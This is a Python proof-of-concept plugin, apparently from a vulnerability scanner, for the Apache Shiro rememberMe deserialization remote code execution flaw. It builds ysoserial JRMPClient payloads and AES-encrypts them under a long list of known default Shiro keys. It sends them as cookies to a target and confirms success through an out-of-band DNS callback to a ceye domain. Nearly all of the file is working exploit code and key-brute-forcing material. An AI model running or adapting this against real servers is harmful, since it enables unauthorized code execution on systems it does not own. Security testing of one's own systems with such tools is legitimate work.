#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import asyncio
import uuid
import subprocess
from Crypto.Cipher import AES
from lib.core.data import logger
from lib.utils.cipher import base64encode
from lib.utils.cipher import base64decode
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'shiro rce'
        self.keyword = ['shiro', 'rce']
        self.info = 'shiro rce'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    def encode_rememberme(self, command, key):
        popen = subprocess.Popen(['java', '-jar', 'tool/ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command],
                                 stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64encode(iv + encryptor.encrypt(file_body))
        return "rememberMe=" + str(base64_ciphertext)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            dns = self.ceye_dns_api(k='shiro550', t='dns')
            # logger.sysinfo(dns + ' ------- '+  self.base_url)
            async with ClientSession() as session:
                keylist = [
                            'kPH+bIxk5D2deZiIxcaaaA==',
                           'wGiHplamyXlVB11UXWol8g==',
                           '2AvVhdsgUs0FSA3SDFAdag==',
                           '4AvVhmFLUs0KTA3Kprsdag==',
                           '3AvVhmFLUs0KTA3Kprsdag==',
                           'Z3VucwAAAAAAAAAAAAAAAA==',
                           'U3ByaW5nQmxhZGUAAAAAAA==',
                           'wGiHplamyXlVB11UXWol8g==',
                           'fCq+/xW488hMTCD+cmJ3aQ==',
                           '1QWLxg+NYmxraMoxAXu/Iw==',
                           'ZUdsaGJuSmxibVI2ZHc9PQ==',
                           'L7RioUULEFhRyxM7a2R/Yg==',
                           '6ZmI6I2j5Y+R5aSn5ZOlAA==',
                           'r0e3c16IdVkouZgk1TKVMg==',
                           '5aaC5qKm5oqA5pyvAAAAAA==',
                           'bWluZS1hc3NldC1rZXk6QQ==',
                           'a2VlcE9uR29pbmdBbmRGaQ==',
                           'WcfHGU25gNnTxTlmJMeSpw==',
                           'MTIzNDU2Nzg5MGFiY2RlZg==',
                           '5AvVhmFLUs0KTA3Kprsdag==',
                           '6ZmI6I2j3Y+R1aSn5BOlAA==',
                           'SkZpbmFsQmxhZGUAAAAAAA==',
                           '2cVtiE83c4lIrELJwKGJUw==',
                           'fsHspZw/92PrS3XrPW+vxw==',
                           'XTx6CKLo/SdSgub+OPHSrw==',
                           'sHdIjUN6tzhl8xZMG3ULCQ==',
                           'O4pdf+7e+mZe8NyxMTPJmQ==',
                           'f/SY5TIve5WWzT4aQlABJA==',
                           'HWrBltGvEZc14h9VpMvZWw==',
                           'rPNqM6uKFCyaL10AK51UkQ==',
                           'Y1JxNSPXVwMkyvES/kJGeQ==',
                           'lT2UvDUmQwewm6mMoiw4Ig==',
                           'MPdCMZ9urzEA50JDlDYYDg==',
                           'xVmmoltfpb8tTceuT5R7Bw==',
                           'c+3hFGPjbgzGdrC+MHgoRQ==',
                           'ClLk69oNcA3m+s0jIMIkpg==',
                           'Bf7MfkNR0axGGptozrebag==',
                           '1tC/xrDYs8ey+sa3emtiYw==',
                           'ZmFsYWRvLnh5ei5zaGlybw==',
                           'cGhyYWNrY3RmREUhfiMkZA==',
                           'IduElDUpDDXE677ZkhhKnQ==',
                           'yeAAo1E8BOeAYfBlm4NG9Q==',
                           'cGljYXMAAAAAAAAAAAAAAA==',
                           '2itfW92XazYRi5ltW0M2yA==',
                           'XgGkgqGqYrix9lI6vxcrRw==',
                           '25BsmdYwjnfcWmnhAciDDg==',
                           'ertVhmFLUs0KTA3Kprsdag==',
                           '5AvVhmFLUS0ATA4Kprsdag==',
                           's0KTA3mFLUprK4AvVhsdag==',
                           'hBlzKg78ajaZuTE0VLzDDg==',
                           '9FvVhtFLUs0KnA3Kprsdyg==',
                           'd2ViUmVtZW1iZXJNZUtleQ==',
                           'yNeUgSzL/CfiWw1GALg6Ag==',
                           'NGk/3cQ6F5/UNPRh8LpMIg==',
                           '4BvVhmFLUs0KTA3Kprsdag==',
                           'MzVeSkYyWTI2OFVLZjRzZg=='
                ]
                for i in range(0,len(keylist)):
                    cmd = "%s:80" % (dns)
                    # cmd = "ping %d.shiro.%s" % (i, dns)
                    cookie = self.encode_rememberme(cmd, keylist[i])
                    header = {"Cookie": cookie}
                    path_list = list(set([
                        self.url_normpath(self.base_url, '/'),
                        self.url_normpath(self.url, './'),
                    ]))
                    for url in path_list:
                        try:
                            async with session.post(url=url, headers=header) as res:
                                pass
                        except:
                            pass
                            # await asyncio.sleep(3)
                            # if res !=None:
                            #     if await self.ceye_verify_api(dns, 'http'):
                            #         self.flag = 1
                            #         self.res.append({"info": url, "key": keylist[i]})
                            #         break
                # for i in range(0, len(keylist)):
                #     if res != None:
                #         dnstext = "%d.shiro.%s" %(i, dns)
                #         await asyncio.sleep(1)
                #         if await self.ceye_verify_api(dnstext, 'dns'):
                #             self.flag = 1
                #             self.res.append({"info": url, "key": keylist[i]})
                #             break
                if await self.ceye_verify_api(dns, 'dns'):
                    self.flag = 1
                    self.res.append({"info": url, "key": dns})






